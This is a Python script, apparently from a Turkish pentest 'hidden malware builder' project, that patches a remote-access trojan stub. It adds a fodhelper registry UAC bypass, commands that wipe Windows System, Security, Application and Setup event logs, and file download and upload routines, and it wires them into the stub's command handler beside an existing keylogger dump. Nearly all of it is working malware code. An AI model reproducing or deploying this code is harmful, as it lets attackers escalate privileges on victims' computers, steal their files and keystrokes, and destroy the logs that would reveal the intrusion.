import os
import re

file_path = r'C:\Users\ASUS\Desktop\Pentest-Cheatsheet-master\Moduller\11_Gizli_Zararli_Olusturucu\stub_template.py'

with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

new_functions = '''
def getsystem():
    try:
        import winreg
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        
        # Fodhelper UAC Bypass
        reg_path = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
        except Exception as e:
            return f"Registry yazma hatası: {e}".encode()
            
        import ctypes
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "fodhelper.exe", None, None, 0)
        
        # Wait a bit then clean up
        time.sleep(3)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        except: pass
        
        return b"UAC Bypass (fodhelper) tetiklendi. Zombi yeni yetkiyle baglanacak."
    except Exception as e:
        return f"Getsystem hatasi: {e}".encode()

def clear_logs():
    try:
        subprocess.run("wevtutil cl System", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Application", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Security", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Setup", shell=True, capture_output=True)
        return b"Windows Olay Gunlukleri (Event Logs) temizlendi."
    except Exception as e:
        return f"Log silme hatasi: {e}".encode()

def download_file(filename):
    try:
        if not os.path.exists(filename):
            return b"Hata: Dosya bulunamadi."
        with open(filename, "rb") as f:
            data = f.read()
        return b"!DOWNLOAD_START!" + base64.b64encode(data)
    except Exception as e:
        return f"Download hatasi: {e}".encode()

def upload_file(args):
    try:
        # args is: filename base64data
        parts = args.split(" ", 1)
        if len(parts) < 2: return b"Eksik parametre."
        filename, b64_data = parts[0], parts[1]
        with open(filename, "wb") as f:
            f.write(base64.b64decode(b64_data))
        return f"Dosya basariyla yuklendi: {filename}".encode()
    except Exception as e:
        return f"Upload hatasi: {e}".encode()
'''

content = content.replace('def keylogger_worker():', new_functions + '\ndef keylogger_worker():')

# Modify run_cmd to handle new commands
old_run_cmd_chunk = '''        elif command == "!keylog_dump":
            global keylog_data
            data = keylog_data
            keylog_data = ""
            return data.encode() if data else b"No keystrokes captured yet."'''

new_run_cmd_chunk = old_run_cmd_chunk + '''
        elif command == "!getsystem":
            return getsystem()
        elif command == "!clear_logs":
            return clear_logs()
        elif command.startswith("!download "):
            return download_file(command[10:].strip())
        elif command.startswith("!upload "):
            return upload_file(command[8:].strip())'''

content = content.replace(old_run_cmd_chunk, new_run_cmd_chunk)

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)
